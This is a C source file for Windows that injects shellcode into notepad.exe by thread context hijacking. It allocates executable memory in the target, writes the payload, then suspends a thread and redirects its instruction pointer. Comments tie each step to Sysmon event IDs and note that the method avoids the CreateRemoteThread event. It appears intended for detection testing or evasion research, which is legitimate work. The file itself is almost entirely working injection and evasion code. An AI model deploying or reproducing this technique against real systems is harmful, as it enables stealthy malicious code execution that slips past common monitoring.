#include "common.h"

int main() {
    DWORD pid = GetPID(L"notepad.exe");
    if (!pid) {
        wprintf(L"[-] notepad.exe not found\n");
        return 1;
    }
    wprintf(L"[*] Target PID: %lu\n", pid);

    DWORD accessMask = PROCESS_VM_WRITE      |
                       PROCESS_VM_OPERATION  |
                       PROCESS_QUERY_INFORMATION;
    wprintf(L"[+] Requested process access mask: 0x%08X\n", accessMask);

    // EID 10 fires here — no CREATE_THREAD needed
    HANDLE hProc = OpenProcess(accessMask, FALSE, pid);
    if (!hProc) {
        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Process handle acquired\n");

    // Allocate RWX memory for shellcode
    LPVOID remoteMem = VirtualAllocEx(
        hProc, NULL, shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!remoteMem) {
        wprintf(L"[-] VirtualAllocEx failed\n");
        return 1;
    }
    wprintf(L"[+] Remote memory allocated: 0x%p\n", remoteMem);

    // Write shellcode
    SIZE_T written = 0;
    WriteProcessMemory(hProc, remoteMem, shellcode, shellcode_size, &written);
    wprintf(L"[+] Shellcode written: %zu bytes\n", written);

    // Find a thread to hijack in target process
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    DWORD tid = 0;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                tid = te.th32ThreadID;
                break;
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);

    if (!tid) {
        wprintf(L"[-] No thread found in target\n");
        return 1;
    }
    wprintf(L"[*] Target thread ID: %lu\n", tid);

    // Open thread with suspend/resume and context rights
    HANDLE hThread = OpenThread(
        THREAD_SUSPEND_RESUME |
        THREAD_GET_CONTEXT    |
        THREAD_SET_CONTEXT,
        FALSE, tid
    );
    if (!hThread) {
        wprintf(L"[-] OpenThread failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Thread handle acquired\n");

    // Suspend the thread
    DWORD suspendCount = SuspendThread(hThread);
    wprintf(L"[+] Thread suspended — count: %lu\n", suspendCount);

    // Get current thread context
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        wprintf(L"[-] GetThreadContext failed: %lu\n", GetLastError());
        ResumeThread(hThread);
        return 1;
    }
    wprintf(L"[+] Original Rip: 0x%llx\n", ctx.Rip);
    wprintf(L"[+] Original Rsp: 0x%llx\n", ctx.Rsp);

    // Save original Rip — restore after shellcode if needed
    DWORD64 originalRip = ctx.Rip;

    // Redirect thread to shellcode
    ctx.Rip = (DWORD64)remoteMem;

    // Align stack
    ctx.Rsp &= ~0xF;
    ctx.Rsp -= 0x8;

    if (!SetThreadContext(hThread, &ctx)) {
        wprintf(L"[-] SetThreadContext failed: %lu\n", GetLastError());
        ResumeThread(hThread);
        return 1;
    }
    wprintf(L"[+] Thread context hijacked — Rip: 0x%p\n", remoteMem);

    // Resume thread — executes shellcode instead of original code
    // NO new thread created — EID 8 should NOT fire
    ResumeThread(hThread);
    wprintf(L"[+] Thread resumed\n");
    wprintf(L"[*] EID 8 should NOT fire — no new thread created\n");
    wprintf(L"[*] EID 10 should show process handle open\n");
    wprintf(L"[*] No CREATE_THREAD right needed — watch GrantedAccess\n");

    Sleep(5000);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
